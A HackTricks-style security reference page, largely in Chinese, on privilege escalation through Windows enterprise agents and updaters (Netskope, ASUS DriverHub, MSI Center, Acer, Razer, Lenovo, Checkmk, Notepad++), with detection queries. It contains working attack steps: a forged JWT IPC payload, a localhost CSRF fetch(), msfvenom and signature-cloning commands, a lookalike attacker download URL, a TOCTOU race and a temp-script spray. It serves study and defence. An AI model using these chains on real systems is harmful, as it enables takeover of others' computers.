# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

本页面概括了一类 Windows 本地 privilege escalation 链，这些链存在于 enterprise endpoint agents 和 updaters 中；它们暴露了易于利用的 IPC surface 以及 privileged update flow。一个典型示例是 Netskope Client for Windows < R129（CVE-2025-0309）：low-privileged user 可以诱导 enrollment 连接到 attacker-controlled server，然后交付一个由 SYSTEM service 安装的 malicious MSI。<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

可针对类似产品复用的关键思路：
- 利用 privileged service 的 localhost IPC，强制其重新 enrollment 或重新配置到 attacker server。
- 实现 vendor 的 update endpoints，交付 rogue Trusted Root CA，并将 updater 指向 malicious、“signed” package。
- 绕过薄弱的 signer checks（CN allow-lists）、可选的 digest flags 以及宽松的 MSI properties。
- 如果 IPC 是“encrypted”的，则从 registry 中以 world-readable 形式存储的 machine identifiers 派生 key/IV。
- 如果 service 根据 image path/process name 限制 callers，则 inject 到 allow-listed process 中，或者以 suspended 状态启动一个进程，并通过 minimal thread-context patch bootstrap 你的 DLL。

---
## 1) 通过 localhost IPC 强制 enrollment 连接到 attacker server

许多 agents 都会提供一个 user-mode UI process，该进程通过 localhost TCP 使用 JSON 与 SYSTEM service 通信。

在 Netskope 中观察到：
- UI：stAgentUI（low integrity）↔ Service：stAgentSvc（SYSTEM）
- IPC command ID 148：IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow：
1) 构造一个 JWT enrollment token，使其 claims 能控制 backend host（例如 AddonUrl）。使用 alg=None，这样就不需要 signature。
2) 使用你的 JWT 和 tenant name，发送调用 provisioning command 的 IPC message：
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) 该 service 开始向你的 rogue server 发起 enrollment/config 请求，例如：
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

注意：
- 如果 caller verification 基于路径/名称，则应从 allow-listed vendor binary 发起请求（见 §4）。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) 劫持 update channel，以 SYSTEM 身份运行代码

客户端开始与服务器通信后，实现其预期的 endpoints，并引导它获取攻击者的 MSI。典型流程：

1) /v2/config/org/clientconfig → 返回 JSON config，将 updater interval 设置得非常短，例如：
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → 返回 PEM CA certificate。该服务会将其安装到 Local Machine Trusted Root store。
3) /v2/checkupdate → 提供指向恶意 MSI 和伪造版本的 metadata。

绕过现实中常见的检查：
- Signer CN allow-list：服务可能只检查 Subject CN 是否等于 “netSkope Inc” 或 “Netskope, Inc.”。你的 rogue CA 可以签发具有该 CN 的 leaf，并对 MSI 进行签名。
- CERT_DIGEST property：包含一个名为 CERT_DIGEST 的无害 MSI property。安装时不会执行 enforcement。
- Optional digest enforcement：config flag（例如 `check_msi_digest=false`）会禁用额外的 cryptographic validation。

结果：SYSTEM service 会从
C:\ProgramData\Netskope\stAgent\data\*.msi
安装你的 MSI，并以 NT AUTHORITY\SYSTEM 身份执行任意 code。<sup>[[1]](#references)[[2]](#references)</sup>

Patch-bypass lesson：如果 vendor 的响应是 allow-list 一小组“trusted” domains，而不是对 update source 进行 cryptographic authentication，请寻找仍允许你控制 traffic 的 vendor-owned redirectors 或 reverse proxies。在 Netskope 的案例中，公开的后续 research 表明，R129-era allow-list 仍可通过 `rproxy.goskope.com` 被滥用；该服务会代理 attacker-controlled Azure App Service content。应将 hostname allow-list 视为 speed bump，而不是 trust boundary。<sup>[[14]](#references)</sup>

---
## 3) Forging encrypted IPC requests（当存在时）

从 R127 开始，Netskope 将 IPC JSON 封装在看起来像 Base64 的 encryptData field 中。Reversing 显示，其使用 AES，key/IV 从任何 user 都可读取的 registry values 派生：
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers 可以复现 encryption，并从 standard user 发送有效的 encrypted commands。<sup>[[1]](#references)[[2]](#references)</sup> 通用提示：如果 agent 突然开始对其 IPC 进行“encrypt”，请在 HKLM 下查找 device IDs、product GUIDs、install IDs，并将其作为 material。

---
## 4) Bypassing IPC caller allow-lists（path/name checks）

某些 services 会通过解析 TCP connection 的 PID，并将 image path/name 与位于 Program Files 下的 allow-listed vendor binaries（例如 stagentui.exe、bwansvc.exe、epdlp.exe）进行比较，以 authenticate peer。

两种 practical bypass：
- 将 DLL injection 注入 allow-listed process（例如 nsdiag.exe），并从其中 proxy IPC。
- 以 suspended 状态启动 allow-listed binary，并在不使用 CreateRemoteThread 的情况下 bootstrap 你的 proxy DLL（参见 §5），以满足 driver-enforced tamper rules。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper-protection friendly injection：suspended process + NtContinue patch

Products 通常会部署 minifilter/OB callbacks driver（例如 Stadrv），用于从指向 protected processes 的 handles 中移除危险 rights：
- Process：移除 PROCESS_TERMINATE、PROCESS_CREATE_THREAD、PROCESS_VM_READ、PROCESS_DUP_HANDLE、PROCESS_SUSPEND_RESUME
- Thread：限制为 THREAD_GET_CONTEXT、THREAD_QUERY_LIMITED_INFORMATION、THREAD_RESUME、SYNCHRONIZE

一种遵守这些 constraints 的可靠 user-mode loader：
1) 使用 CREATE_SUSPENDED 对 vendor binary 执行 CreateProcess。
2) 获取仍被允许的 handles：process 上的 PROCESS_VM_WRITE | PROCESS_VM_OPERATION，以及具有 THREAD_GET_CONTEXT/THREAD_SET_CONTEXT 的 thread handle（或者，如果你在已知 RIP 处 patch code，则只需 THREAD_RESUME）。
3) 将 ntdll!NtContinue（或其他早期且 guaranteed-mapped 的 thunk）覆盖为一个 tiny stub；该 stub 调用 LoadLibraryW 加载你的 DLL path，然后跳回去。
4) 执行 ResumeThread，在 process 内触发你的 stub，从而加载你的 DLL。

由于你从未对已受保护的 process 使用 PROCESS_CREATE_THREAD 或 PROCESS_SUSPEND_RESUME（该 process 是由你创建的），因此 driver 的 policy 得到满足。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Practical tooling
- NachoVPN（Netskope plugin）会自动完成 rogue CA、malicious MSI signing，并提供所需的 endpoints：/v2/config/org/clientconfig、/config/ca/cert、/v2/checkupdate。<sup>[[3]](#references)</sup>
- UpSkope 是一个 custom IPC client，可构造任意（可选 AES-encrypted）IPC messages，并包含 suspended-process injection，以便从 allow-listed binary 发起请求。<sup>[[4]](#references)</sup>

## 7) Unknown updater/IPC surfaces 的快速 triage workflow

面对新的 endpoint agent 或 motherboard “helper” suite 时，通常只需一个 quick workflow，就足以判断它是否可能是有价值的 privesc target：<sup>[[6]](#references)</sup>

1) 枚举 loopback listeners，并将其映射回 vendor processes：
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) 枚举候选命名管道：
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) 挖掘基于 registry 的路由数据，该数据由基于 plugin 的 IPC servers 使用：
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) 先从 user-mode client 中提取 endpoint 名称、JSON keys 和 command IDs。Packed Electron/.NET frontends 经常会泄露完整 schema：
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) 寻找实际的信任判定条件，而不只是最终启动进程的代码路径：
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
值得优先关注的模式：
- `CryptQueryObject`/certificate parsing 未配合 `WinVerifyTrust`，通常意味着程序将“证书存在”当成了“证书受信任”，从而允许 certificate cloning 或其他 fake-signer tricks。
- 对 `Origin`、`Referer`、download URLs、process names 或 signer CNs 进行 substring/suffix checks 并不构成 authentication。`contains(".vendor.com")` 通常可被 attacker-controlled lookalike domains 利用。
- 如果 low-privileged GUI 决定“文件是 trusted 的”，而 SYSTEM broker 只是使用该结果，那么 patch 或重新实现 client-side DLL/JS 往往可以完全绕过这条边界（Razer-style split validation）。
- 如果 broker 将 payload 复制到 `%TEMP%`/`C:\Windows\Temp`，然后从该路径进行 validate 或 schedule，应立即测试 TOCTOU replacement windows，以及是否存在带有较弱 checks、暴露其他 `ExecuteTask()` wrappers 的 sibling plugin modules。<sup>[[6]](#references)</sup>

对于 named-pipe-heavy targets，PipeViewer 可以快速发现 weak DACLs 和 remotely reachable pipes，然后再开始深入 reverse protocol。<sup>[[11]](#references)</sup>

如果 target 仅通过 PID、image path 或 process name 对 callers 进行 authentication，应将其视为 speed bump，而不是 boundary：injecting into the legitimate client，或通过 allow-listed process 建立 connection，通常就足以满足 server 的 checks。对于 named pipes，关于 client impersonation 和 pipe abuse 的 [this page](named-pipe-client-impersonation.md) 对该 primitive 进行了更深入的介绍。

---
## 8) 仅通过 vendor signatures 进行 authentication 的 modular add-in brokers（Lenovo Vantage pattern）

一种值得进一步 hunting 的较新变体是 **signed-client RPC broker**：一个 low-privileged Lenovo-signed desktop process 与 SYSTEM service 通信，而该 service 将 JSON commands 路由到 `%ProgramData%` 下的一组由 XML 描述的 add-ins 中。一旦在**任意被接受的 signed client 内部**实现 code execution，每个 `runas="system"` contract 都会成为你的 attack surface。<sup>[[15]](#references)</sup>

Lenovo Vantage research 中观察到的 high-value primitives：
- **因为 caller 由 vendor 签名而信任它**：researchers 通过将 Lenovo-signed EXE 复制到 writable directory，并满足 DLL side-load（`profapi.dll`）条件，使 arbitrary code 在 service 已经信任的 client 内运行，从而进入 authenticated context。
- **Manifest-driven attack surface discovery**：add-ins 在 `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` 下声明；多个 contracts 以 `SYSTEM` 身份运行，因此枚举这些 manifests 往往比 reverse broker 本身更快发现真正的 privileged verbs。
- **authenticated channel 后的 per-command bugs**：进入 trusted client 后，公开 research 发现了 update/install verbs 中的 path-traversal + race conditions、privileged settings databases 中的 raw-SQL abuse，以及允许在 intended hive 之外执行 writes 的 substring-based registry path checks。

对 target 有用的 recon：
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
实用要点：每当某个 helper suite 暴露出一个 broker，先对 **caller process** 进行身份验证，然后再将请求分派到数十个 plugin/add-in 命令时，不要在绕过前端信任检查后就停止。导出 manifest/contract table，并分别对每个高权限 verb 进行 fuzz；经过身份验证的 channel 通常会隐藏多个 second-stage 漏洞。

---
## 1) 针对特权 HTTP APIs 的 Browser-to-localhost CSRF（ASUS DriverHub）

DriverHub 提供了一个 user-mode HTTP service（ADU.exe），监听于 127.0.0.1:53000，并要求浏览器请求来自 https://driverhub.asus.com。该 origin filter 仅对 Origin header 以及 `/asus/v1.0/*` 暴露的 download URLs 执行 `string_contains(".asus.com")`。因此，任何由攻击者控制、包含 `https://driverhub.asus.com.attacker.tld` 这样的 host 都能通过检查，并可从 JavaScript 发起会改变状态的请求。<sup>[[6]](#references)</sup> 更多 bypass 模式请参阅 [CSRF 基础知识](../../pentesting-web/csrf-cross-site-request-forgery.md)。

实际流程：
1) 注册一个包含 `.asus.com` 的 domain，并在其中托管恶意网页。
2) 使用 `fetch` 或 XHR 调用 `http://127.0.0.1:53000` 上的特权 endpoint（例如 `Reboot`、`UpdateApp`）。
3) 发送 handler 所需的 JSON body——打包后的 frontend JS 展示了如下 schema。
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
即使如下所示的 PowerShell CLI，在将 Origin header 伪造为受信任值时也能成功：
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
因此，访问 attacker site 的任何浏览器操作都会变成一次 1-click（或通过 `onload` 实现 0-click）的本地 CSRF，从而驱动一个 SYSTEM helper。

---
## 2) 不安全的 code-signing verification 与 certificate cloning（ASUS UpdateApp）

`/asus/v1.0/UpdateApp` 会下载 JSON body 中定义的任意 executable，并将其缓存到 `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`。Download URL validation 复用了相同的 substring logic，因此 `http://updates.asus.com.attacker.tld:8000/payload.exe` 会被接受。下载完成后，ADU.exe 只检查 PE 是否包含 signature，以及 Subject string 是否匹配 ASUS，然后便运行它——没有 `WinVerifyTrust`，也没有 chain validation。

要将此流程 weaponize：
1) 创建 payload（例如，`msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`）。
2) 将 ASUS 的 signer clone 到其中（例如，`python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`）。
3) 将 `pwn.exe` 托管在一个 `.asus.com` lookalike domain 上，并通过上面的 browser CSRF 触发 UpdateApp。

由于 Origin 和 URL filters 都基于 substring，而 signer check 只比较 strings，DriverHub 会在其 elevated context 下拉取并执行 attacker binary。<sup>[[6]](#references)</sup>

---
## 1) updater copy/execute paths 中的 TOCTOU（MSI Center CMD_AutoUpdateSDK）

MSI Center 的 SYSTEM service 暴露了一个 TCP protocol，其中每个 frame 都是 `4-byte ComponentID || 8-byte CommandID || ASCII arguments`。核心 component（Component ID `0f 27 00 00`）包含 `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`。其 handler 会：
1) 将 supplied executable 复制到 `C:\Windows\Temp\MSI Center SDK.exe`。
2) 通过 `CS_CommonAPI.EX_CA::Verify` 验证 signature（certificate subject 必须等于 “MICRO-STAR INTERNATIONAL CO., LTD.”，且 `WinVerifyTrust` 必须成功）。
3) 创建一个 scheduled task，以 SYSTEM 身份运行 temp file，并使用 attacker-controlled arguments。

在 verification 与 `ExecuteTask()` 之间，复制的 file 没有被锁定。攻击者可以：
- 发送 Frame A，指向一个合法的 MSI-signed binary（确保 signature check 通过并将 task 加入队列）。
- 使用反复发送的 Frame B 与其进行 race；Frame B 指向 malicious payload，并在 verification 完成后立即覆盖 `MSI Center SDK.exe`。

scheduler 触发时，会在 SYSTEM 下执行被覆盖的 payload，尽管此前验证的是原始 file。可靠 exploitation 使用两个 goroutines/threads，不断 spam CMD_AutoUpdateSDK，直到赢得 TOCTOU window。<sup>[[6]](#references)</sup>

---
## 2) Abusing custom SYSTEM-level IPC & impersonation（MSI Center + Acer Control Centre）

### MSI Center TCP command sets
- `MSI.CentralServer.exe` 加载的每个 plugin/DLL 都会接收一个存储在 `HKLM\SOFTWARE\MSI\MSI_CentralServer` 下的 Component ID。frame 的前 4 个 bytes 用于选择该 component，使攻击者能够将 commands 路由到任意 modules。
- Plugins 可以定义自己的 task runners。`Support\API_Support.dll` 暴露 `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}`，并直接调用 `API_Support.EX_Task::ExecuteTask()`，没有任何 signature validation——任意 local user 都可以将其指向 `C:\Users\<user>\Desktop\payload.exe`，从而确定性地获得 SYSTEM execution。
- 使用 Wireshark sniff loopback，或在 dnSpy 中 instrument .NET binaries，可以快速发现 Component ↔ command mapping；随后即可使用 custom Go/ Python clients replay frames。<sup>[[6]](#references)</sup>

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe`（SYSTEM）暴露 `\\.\pipe\treadstone_service_LightMode`，其 discretionary ACL 允许 remote clients（例如 `\\TARGET\pipe\treadstone_service_LightMode`）。发送带有 file path 的 command ID `7` 会调用 service 的 process-spawning routine。
- client library 会将 magic terminator byte（113）与 args 一同进行 serialization。使用 Frida/`TsDotNetLib` 进行 dynamic instrumentation（instrumentation 技巧参见 [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md)）可以看到，native handler 会在调用 `CreateProcessAsUser` 前，将该值映射到 `SECURITY_IMPERSONATION_LEVEL` 和 integrity SID。
- 将 113（`0x71`）替换为 114（`0x72`）会进入 generic branch；该分支保留完整的 SYSTEM token，并设置 high-integrity SID（`S-1-16-12288`）。因此，spawned binary 会以 unrestricted SYSTEM 身份运行，无论是在本地还是跨 machine。
- 将其与 exposed installer flag（`Setup.exe -nocheck`）结合，即使在 lab VMs 上也能启动 ACC，并在没有 vendor hardware 的情况下测试该 pipe。<sup>[[6]](#references)</sup>

这些 IPC bugs 说明，localhost services 必须强制 mutual authentication（ALPC SIDs、`ImpersonationLevel=Impersonation` filters、token filtering），并且每个 module 的 “run arbitrary binary” helper 都必须使用相同的 signer verifications。

---
## 3) 由 weak user-mode validation 支持的 COM/IPC “elevator” helpers（Razer Synapse 4）

Razer Synapse 4 为这一类问题增加了另一种实用 pattern：low-privileged user 可以请求 COM helper 通过 `RzUtility.Elevator` launch process，而 trust decision 则被委托给 user-mode DLL（`simple_service.dll`），而不是在 privileged boundary 内进行 robust enforcement。

观察到的 exploitation path：
- Instantiate COM object `RzUtility.Elevator`。
- 调用 `LaunchProcessNoWait(<path>, "", 1)`，请求 elevated launch。
- 在 public PoC 中，会先 patch out `simple_service.dll` 内的 PE-signature gate，再发出 request，从而允许 launch 任意 attacker-chosen executable。<sup>[[6]](#references)[[10]](#references)</sup>

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
总体要点：在分析“helper”套件时，不要止步于 localhost TCP 或 named pipes。检查名称类似于 `Elevator`、`Launcher`、`Updater` 或 `Utility` 的 COM classes，然后确认 privileged service 是自行验证目标 binary，还是仅仅信任由可被 patch 的 user-mode client DLL 计算出的结果。这种模式并不局限于 Razer：任何由 high-privilege broker 使用 low-privilege 端提供的 allow/deny 决策的分离式设计，都可能成为 privesc attack surface。


---
## MSI repair 期间可预测的临时脚本执行（Checkmk Agent / CVE-2024-0670）

一些 Windows agents 仍通过将临时 `.cmd` 写入 `C:\Windows\Temp`，然后以 `SYSTEM` 身份执行它，来实现 privileged actions。如果文件名可预测，且 service 未能安全地重新创建已有文件，low-privileged user 就可以预先创建未来的临时文件并将其设为 **read-only**，使 privileged process 执行 attacker-controlled content，而不是其自身的 script。

在存在漏洞的 Checkmk Agent builds 中观察到：
- temp pattern: `cmk_all_<PID>_1.cmd`
- affected branches: `2.0.0`、`2.1.0`、`2.2.0`
- trigger: cached agent package 的 MSI **repair**<sup>[[8]](#references)[[9]](#references)</sup>

Practical workflow:
1. 根据当前 process IDs 或正在运行的 agent PID，估算一个合理的 PID range。
2. 编写简短的 **ASCII** `.cmd` payload（使用 `Set-Content -Encoding Ascii` 或 `cmd.exe` redirection；避免使用 PowerShell 输出的 UTF-16 batch files）。
3. 在候选 range 内批量创建 `C:\Windows\Temp\cmk_all_<PID>_1.cmd`，并将每个文件标记为 read-only。
4. 对 cached MSI 触发 repair，使 privileged service 尝试重新生成并执行临时 script。<sup>[[7]](#references)</sup>
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
如果易受攻击的产品是通过 Windows Installer 安装的，请在触发修复之前，将 `C:\Windows\Installer` 下看起来随机的缓存 MSI 映射回其产品名称：<sup>[[7]](#references)</sup>
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
操作注意事项：
- 当 `msiexec /fa` 在非交互式 WinRM shell 中失败，并且你需要确认现有桌面/断开连接的 session 是否能够正确触发修复时，`qwinsta` 很有用。<sup>[[7]](#references)</sup>
- 此模式也适用于其他 endpoint agents 和 updaters：它们会**在所有用户可写的位置暂存临时脚本，之后以 SYSTEM 身份执行这些脚本**。测试可预测的名称、缺少 exclusive create 语义的情况，以及能够按需触发的 repair/update 流程。

---
## 通过弱 updater 验证实施远程 supply-chain hijack（WinGUp / Notepad++）

在 2025 年 6 月至 2025 年 12 月期间，攻击者入侵了 Notepad++ update flow 背后的 hosting infrastructure，并向特定受害者选择性地提供恶意 manifests。较旧的基于 WinGUp 的 updaters 未能完整验证 update authenticity，因此恶意 XML 响应可以将 clients 重定向到攻击者控制的 URLs。由于 client 接受 HTTPS 内容时没有同时强制验证受信任的 certificate chain 和下载 installer 的有效 PE signature，受害者下载并执行了被植入木马的 NSIS `update.exe`。<sup>[[12]](#references)[[13]](#references)</sup>

Operational flow（无需本地 exploit）：
1. **Infrastructure interception**：入侵 CDN/hosting，并使用指向恶意 download URL 的攻击者 metadata 响应 update checks。
2. **Trojanized NSIS**：installer 获取/执行 payload，并滥用两条 execution chains：
- **Bring-your-own signed binary + sideload**：捆绑已签名的 Bitdefender `BluetoothService.exe`，并将恶意 `log.dll` 放入其 search path。当已签名 binary 运行时，Windows 会 sideload `log.dll`，后者解密并 reflectively loads Chrysalis backdoor（受 Warbird 保护，并使用 API hashing 阻碍 static detection）。
- **Scripted shellcode injection**：NSIS 执行已编译的 Lua script，使用 Win32 APIs（例如 `EnumWindowStationsW`）注入 shellcode，并分阶段加载 Cobalt Strike Beacon。<sup>[[12]](#references)</sup>

适用于任何 auto-updater 的 Hardening/detection 要点：
- 强制对下载的 installer 执行**certificate + signature verification**（固定 vendor signer，拒绝不匹配的 CN/chain），并对 update manifest 本身进行签名（例如 XMLDSig）。除非经过验证，否则阻止由 manifest 控制的 redirects。
- 将 **BYO signed binary sideloading** 视为 post-download detection pivot：当已签名的 vendor EXE 从其 canonical install path 之外加载 DLL 名称时发出警报（例如 Bitdefender 从 Temp/Downloads 加载 `log.dll`），并在 updater 从 temp 写入/执行具有非 vendor signatures 的 installers 时发出警报。
- 监控此 execution chain 中观察到的**特定于 malware 的 artifacts**（可作为通用 pivots）：mutex `Global\Jdhfv_1.0.1`、异常的 `gup.exe` 向 `%TEMP%` 写入，以及由 Lua 驱动的 shellcode injection stages。
- Notepad++ 在 v8.8.9 及更高版本中通过强化 WinGUp 作出响应：返回的 XML 现在经过签名（XMLDSig），并且更新版本会对下载的 installer 强制执行 certificate + signature verification，而不是仅信任 transport。<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> 启动非 Notepad++ 安装程序</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

这些模式适用于任何接受未签名 manifest 或未能固定 installer signer 的 updater——network hijack + malicious installer + BYO-signed sideloading 可在“trusted”更新的掩护下实现 remote code execution。

---
## References
- [1] [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
